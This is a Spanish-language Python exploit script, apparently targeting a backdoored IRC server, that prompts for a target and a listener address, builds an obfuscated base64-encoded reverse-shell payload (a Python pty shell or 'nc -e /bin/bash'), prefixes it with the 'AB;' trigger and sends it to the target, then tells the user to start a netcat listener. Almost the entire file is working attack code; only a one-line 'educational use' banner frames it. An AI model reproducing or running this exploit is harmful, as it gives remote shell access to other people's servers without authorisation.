#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import base64
import sys
import time

# Colores para la terminal - Tema Oscuro y Rojo
class Color:
    ROJO_OSCURO = '\033[91m'      # Rojo brillante
    ROJO_SANGRE = '\033[38;5;88m' # Rojo oscuro intenso
    GRIS_OSCURO = '\033[90m'      # Gris oscuro (texto secundario)
    NEGRO_FONDO = '\033[40m'      # Fondo negro (opcional)
    ROJO_BRILLANTE = '\033[38;5;196m'  # Rojo puro brillante
    BLANCO_TENUE = '\033[37m'     # Blanco tenue para contraste
    FIN = '\033[0m'
    NEGRITA = '\033[1m'
    SUBRAYADO = '\033[4m'

def banner():
    """Muestra el banner inicial"""
    print(f"\n{Color.ROJO_BRILLANTE}{Color.NEGRITA}")
    print(r"""  __  _  _  ____           ____  ____   ___  ____  
 /. |( \/ )(_  _)   ___   (_  _)(  _ \ / __)(  _ \ 
(_  _)\  /  _)(_   (___)   _)(_  )   /( (__  )(_) )
  (_)  \/  (____)         (____)(_)\_) \___)(____/ """)
    print(f"{Color.FIN}\n")
    print(f"{Color.ROJO_SANGRE} ADVERTENCIA: Solo para uso educativo y autorizado{Color.FIN}\n")

def log(mensaje, tipo="info"):
    """Muestra mensajes con colores"""
    timestamp = time.strftime("%H:%M:%S")
    if tipo == "info":
        print(f"{Color.GRIS_OSCURO}[{timestamp}]{Color.FIN} {mensaje}")
    elif tipo == "exito":
        print(f"{Color.ROJO_OSCURO}[{timestamp}] ✓{Color.FIN} {mensaje}")
    elif tipo == "error":
        print(f"{Color.ROJO_BRILLANTE}[{timestamp}] ✗{Color.FIN} {mensaje}")
    elif tipo == "advertencia":
        print(f"{Color.ROJO_SANGRE}[{timestamp}] ⚠{Color.FIN} {mensaje}")

def generar_payload(tipo_payload, ip_local, puerto_local):
    """Genera el payload según el tipo seleccionado"""
    payloads = {
        'python': f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{ip_local}\';EvKOcV={puerto_local};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" ',
        'netcat': f'nc -e /bin/bash {ip_local} {puerto_local}'
    }
    
    payload = payloads.get(tipo_payload)
    base_codificada = base64.b64encode(payload.encode())
    return f'AB; echo {base_codificada.decode()} |base64 -d|/bin/bash \n'

def obtener_entrada(mensaje, tipo="texto"):
    """Solicita entrada al usuario con validación"""
    while True:
        try:
            valor = input(f"{Color.ROJO_OSCURO}➜ {mensaje}: {Color.FIN}").strip()
            if not valor:
                log("Este campo no puede estar vacío", "error")
                continue
            
            if tipo == "puerto":
                puerto = int(valor)
                if 1 <= puerto <= 65535:
                    return puerto
                else:
                    log("El puerto debe estar entre 1 y 65535", "error")
            else:
                return valor
        except ValueError:
            log("Debes introducir un número válido", "error")
        except KeyboardInterrupt:
            print(f"\n\n{Color.ROJO_BRILLANTE}Operación cancelada por el usuario{Color.FIN}")
            sys.exit(0)

def mostrar_menu_payload():
    """Muestra el menú de selección de payload"""
    print(f"\n{Color.NEGRITA}Selecciona el tipo de payload:{Color.FIN}")
    print(f"{Color.ROJO_OSCURO}1){Color.FIN} Python")
    print(f"{Color.ROJO_OSCURO}2){Color.FIN} Netcat")
    
    while True:
        try:
            opcion = input(f"{Color.ROJO_OSCURO}➜ Opción (1-2): {Color.FIN}").strip()
            if opcion == '1':
                return 'python'
            elif opcion == '2':
                return 'netcat'
            else:
                log("Opción inválida. Elige 1 o 2", "error")
        except KeyboardInterrupt:
            print(f"\n\n{Color.ROJO_BRILLANTE}Operación cancelada por el usuario{Color.FIN}")
            sys.exit(0)

def confirmar_accion():
    """Pide confirmación antes de enviar el exploit"""
    print(f"\n{Color.ROJO_SANGRE}{'='*60}{Color.FIN}")
    respuesta = input(f"{Color.NEGRITA}¿Confirmas el envío del exploit? (s/n): {Color.FIN}").strip().lower()
    return respuesta == 's' or respuesta == 'si'

def main():
    """Función principal"""
    banner()
    
    try:
        # Recopilar información del objetivo
        print(f"{Color.NEGRITA}{'='*60}")
        print("CONFIGURACIÓN DEL OBJETIVO")
        print(f"{'='*60}{Color.FIN}\n")
        
        ip_objetivo = obtener_entrada("IP del objetivo")
        puerto_objetivo = obtener_entrada("Puerto del objetivo", "puerto")
        
        # Recopilar información local
        print(f"\n{Color.NEGRITA}{'='*60}")
        print("CONFIGURACIÓN LOCAL (TU MÁQUINA)")
        print(f"{'='*60}{Color.FIN}\n")
        
        ip_local = obtener_entrada("Tu IP local")
        puerto_local = obtener_entrada("Tu puerto local", "puerto")
        
        # Seleccionar tipo de payload
        tipo_payload = mostrar_menu_payload()
        
        # Mostrar resumen
        print(f"\n{Color.NEGRITA}{'='*60}")
        print("RESUMEN DE LA CONFIGURACIÓN")
        print(f"{'='*60}{Color.FIN}")
        print(f"{Color.GRIS_OSCURO}Objetivo:{Color.FIN} {ip_objetivo}:{puerto_objetivo}")
        print(f"{Color.ROJO_OSCURO}Local:{Color.FIN} {ip_local}:{puerto_local}")
        print(f"{Color.ROJO_SANGRE}Payload:{Color.FIN} {tipo_payload.upper()}")
        
        # Confirmar antes de proceder
        if not confirmar_accion():
            log("Operación cancelada", "advertencia")
            sys.exit(0)
        
        # Generar payload
        print(f"\n{Color.NEGRITA}{'='*60}")
        print("INICIANDO EXPLOTACIÓN")
        print(f"{'='*60}{Color.FIN}\n")
        
        log(f"Generando payload de tipo {tipo_payload}...")
        payload = generar_payload(tipo_payload, ip_local, puerto_local)
        log("Payload generado correctamente", "exito")
        
        # Conectar al objetivo
        log(f"Intentando conectar a {ip_objetivo}:{puerto_objetivo}...")
        s = socket.create_connection((ip_objetivo, puerto_objetivo), timeout=10)
        log("Conexión establecida", "exito")
        
        # Enviar payload
        log("Enviando exploit...")
        s.sendall(payload.encode())
        log("Exploit enviado correctamente", "exito")
        
        # Recibir respuesta
        try:
            data = s.recv(1024)
            if data:
                log("Respuesta recibida del servidor", "exito")
        except socket.timeout:
            log("No se recibió respuesta (timeout)", "advertencia")
        
        s.close()
        
        # Mensaje final
        print(f"\n{Color.ROJO_OSCURO}{Color.NEGRITA}{'='*60}")
        print("EXPLOIT ENVIADO EXITOSAMENTE")
        print(f"{'='*60}{Color.FIN}\n")
        print(f"{Color.ROJO_SANGRE}Recuerda iniciar un listener en tu máquina:{Color.FIN}")
        print(f"{Color.ROJO_BRILLANTE}nc -lvnp {puerto_local}{Color.FIN}\n")
        
    except socket.error as error:
        log(f"Error de conexión: {error}", "error")
        sys.exit(1)
    except Exception as error:
        log(f"Error inesperado: {error}", "error")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n\n{Color.ROJO_BRILLANTE}Operación cancelada por el usuario{Color.FIN}")
        sys.exit(0)

if __name__ == "__main__":
    main()
